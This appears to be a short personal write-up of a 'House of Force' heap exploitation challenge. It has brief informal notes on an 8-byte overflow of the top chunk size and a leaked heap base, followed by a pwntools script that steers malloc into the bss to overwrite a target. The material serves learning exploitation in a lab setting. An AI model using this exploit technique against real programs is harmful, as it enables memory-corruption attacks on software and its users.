![](../img/House%20Of%20Force-1782804271166.webp)

the program let us write 8 bytes more than the allocated space, letting us overwrite the """total""" space for heap, which let us do funky stuff

![](../img/House%20Of%20Force-1782804359864.webp)

the program also provide us the heap base, which allow us to calculate the distance from our target

![](../img/House%20Of%20Force-1782804408264.webp)

![](../img/House%20Of%20Force-1782804431287.webp)

pie isnt enabled so we can overflow the pointer to point the malloc pointer? (i didnt remember the name) to malloc a block of data in bss instead of the heap

also i have no idea what puts address is given for

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("house_of_force_patched")

context.binary = exe
context.log_level="debug"

script='''
    b main+453
    c
'''

def main():
    # r = gdb.debug(exe.path, gdbscript=script)
    r = process(exe.path)

    target=0x602010

    r.recvuntil("puts() @ 0x")
    data=r.recvline()
    data=data[:12]
    puts_libc=int(data,16)

    r.recvuntil("heap @ 0x")
    data=r.recvline()
    data=data[:8]
    heap_base=int(data,16)

    r.recvuntil("> ")
    r.sendline(str(1).encode())

    r.recvuntil("size: ")
    r.sendline(str(0x10).encode())

    payload=flat(
        0x18*b"A",
        -1
    )
    r.recvuntil("data: ")
    r.sendline(payload)

    r.recvuntil("> ")
    r.sendline(str(1).encode())

    r.recvuntil("size: ")
    r.sendline(str(target-heap_base-0x40).encode())

    r.recvuntil("data: ")
    r.sendline(payload)

    r.recvuntil("> ")
    r.sendline(str(1).encode())

    r.recvuntil("size: ")
    r.sendline(str(0x50).encode())

    payload=flat(
        "PWNED",
        0
    )
    r.recvuntil("data: ")
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()

```